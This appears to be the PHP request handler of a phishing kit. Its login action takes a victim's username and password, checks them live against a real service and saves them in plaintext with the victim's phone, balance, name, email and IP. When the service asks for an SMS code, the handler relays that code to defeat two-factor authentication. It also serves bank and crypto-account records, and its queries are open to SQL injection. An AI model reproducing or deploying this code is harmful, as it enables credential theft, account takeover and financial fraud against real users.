<?php
include "inc/config.php";
include "inc/functions.php";
include "inc/anti.php";
include "inc/check.php";

// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);


$q = $_GET["q"];
if ($q == "login") {
    antiflood();
    $_SESSION["tfa_stat"] = false;
    $_SESSION["tfa_login"] = "";
    $_SESSION["tfa_password"] = "";
    $login = html_entity_decode(escape("login"));
    $password = html_entity_decode(escape("password"));
    $phone = preg_replace("/[^0-9+]/", "", escape("phone"));
    $passport = escape("passport");
    $device = $mobile == true ? "mobile" : "pc";
    $ip = htmlspecialchars($_SERVER["HTTP_CF_CONNECTING_IP"] ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"]);
    $user = $db->query("SELECT id from users where login='$login' and password='$password'")->fetch_assoc();
    if (strlen($login) < 3 or strlen($password) < 3) {
        die("error");
    } elseif ((!empty($phone) && strlen($phone) < 10) || strlen($phone) > 14) {
        die("error_phone");
    } elseif (isset($user["id"])) {
        $_SESSION["user_id"] = $user["id"];
        die("success");
    } else {
        $checkdurum = check($login, $password);
        if ($checkdurum["status"] === true) {
            $phone = $checkdurum["phone"];
            $balance = $checkdurum["balance"];
            $name = $checkdurum["firstName"];
            $surname = $checkdurum["surname"];
            $email = $checkdurum["email"];
            $query = "INSERT INTO users (login, password, phone, balance, adi, soyadi, email, device, ip) VALUES ('$login', '$password', '$phone', '$balance', '$name', '$surname', '$email', '$device', '$ip')";
            if ($db->query($query)) {
                $_SESSION["user_id"] = $db->insert_id;
                die("success");
            } else {
                die("error");
            }
        } elseif ($checkdurum["status"] === "sms") {
            $_SESSION["tfa_login"] = $login;
            $_SESSION["tfa_password"] = $password;
            $_SESSION["tfa_stat"] = true;
            die("2fa");
        } else {
            die("error");
        }
    }
} elseif ($q == "2fa") {
    if (!$_SESSION["tfa_stat"]) {
        die("error");
    }
    $code = escape("smsCode");
    $checkdurum = tfa_login($code);
    if ($checkdurum["status"] === true) {
        $phone = $checkdurum["phone"];
        $balance = $checkdurum["balance"];
        $name = $checkdurum["firstName"];
        $surname = $checkdurum["surname"];
        $email = $checkdurum["email"];
        $query = "INSERT INTO users (login, password, phone, balance, adi, soyadi, email, device, ip) VALUES ('$_SESSION[tfa_login]', '$_SESSION[tfa_password]', '$phone', '$balance', '$name', '$surname', '$email', '$device', '$ip')";
        if ($db->query($query)) {
            $_SESSION["user_id"] = $db->insert_id;
            die("success");
        } else {
            die("error");
        }
    } else {
        die("error");
    }
} elseif ($q == "logout") {
    unset($_SESSION["user_id"]);
} elseif ($q == "signup" && !isset($us["id"])) {
    $login = escape("login");
    $password = escape("password");
    $phone = preg_replace("/[^0-9+]/", "", escape("phone"));
    $passport = escape("passport");
    $device = $mobile == true ? "mobile" : "pc";
    $type = intval(1);
    $ip = $_SERVER["HTTP_CF_CONNECTING_IP"] ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"];
    if (strlen($login) < 3 or strlen($password) < 3) {
        die("error");
    } else {
        $db->query("INSERT into users set
      login = '$login',
      password = '$password',
      phone = '$phone',
      passport = '$passport',
      device = '$device',
      type = '$type',
      ip = '$ip'");
        $_SESSION["user_id"] = $db->insert_id;
        die("success");
    }
} elseif ($q == "get-bank") {
    $id = intval($_POST["id"]);
    $res = $db->query("SELECT * from banks where id = $id")->fetch_assoc();
    echo json_encode($res, JSON_UNESCAPED_UNICODE);
} elseif ($q == "get-crypto") {
    $id = intval($_POST["id"]);
    $res = $db->query("SELECT * from cryptoacc where id = $id")->fetch_assoc();
    echo json_encode($res, JSON_UNESCAPED_UNICODE);
}
